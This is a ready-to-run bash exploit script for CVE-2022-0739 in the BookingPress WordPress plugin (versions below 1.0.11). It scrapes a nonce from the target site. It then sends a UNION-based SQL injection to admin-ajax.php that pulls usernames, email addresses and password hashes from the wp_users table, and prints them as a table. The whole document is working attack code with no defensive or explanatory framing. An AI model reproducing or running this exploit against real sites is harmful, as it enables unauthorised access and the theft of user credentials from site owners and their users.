#!/bin/bash

get_nonce() {
    nonce_url="$url/"
    if [[ $dir != "" ]]; then
        nonce_url="$url/$dir/"
    fi
    curl -s $nonce_url | grep "_wpnonce" | head -n 1 | cut -d "'" -f 4
}

print_line() {
    printf "%s\n" "*$(printf '%0.s-' {1..21})*$(printf '%0.s-' {1..31})*$(printf '%0.s-' {1..51})*"
}

print_datas() {
    local login email pass
    for (( i=1; i<=$list_login_nb; i++ ))
    do
        login=$(echo $list_login | awk '{print $'$i'}')
        email=$(echo $list_email | awk '{print $'$i'}')
        pass=$(echo $list_pass | awk '{print $'$i'}')
        printf "| %-20s| %-30s| %-50s|\n" "$login" "$email" "$pass"
    done
}

url=""
dir=""
nonce=""

while [[ $# -gt 0 ]]; do
    case $1 in
        -u|--url) url="$2"; shift;;
        -e|--event-dir) dir="$2"; shift ;;
        *) echo "Exploit aborted: invalid option: $1" >&2; exit 1;;
    esac
    shift
done

if [[ -z $url ]]; then
    echo "[-] URL is required" >&2; exit 1
fi

echo "CVE-2022-0739 - BookingPress < 1.0.11"
echo
echo "Options :"
echo "    url : $url"
echo "    dir : $dir"
echo

nonce=$(get_nonce)
if [[ -z $nonce ]]; then
    echo "[-] Invalid URL/directory" >&2; exit 1
fi

echo "[-] Nonce : $nonce"
echo

data=$(curl -s -i "$url/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=$nonce&category_id=1&total_service=1000) UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users-- -")

user_login="bookingpress_service_id"
user_email="bookingpress_category_id"
user_pass="bookingpress_service_name"

list_login=$(echo $data | grep -oP '"'$user_login'":"\K[^"]+' | sed 's/\\//g')
list_email=$(echo $data | grep -oP '"'$user_email'":"\K[^"]+' | sed 's/\\//g')
list_pass=$(echo $data | grep -oP '"'$user_pass'":"\K[^"]+' | sed 's/\\//g')
list_login_nb=$(echo $list_login | wc -w)

if ! [[ $list_login_nb -gt 1 ]]; then
    echo "[-] Invalid URL" >&2; exit 1
fi

echo "[-] $list_login_nb users found"
echo

print_line
printf "| %-20s| %-30s| %-50s|\n" "user_login" "user_email" "user_pass"
print_line
print_datas
print_line
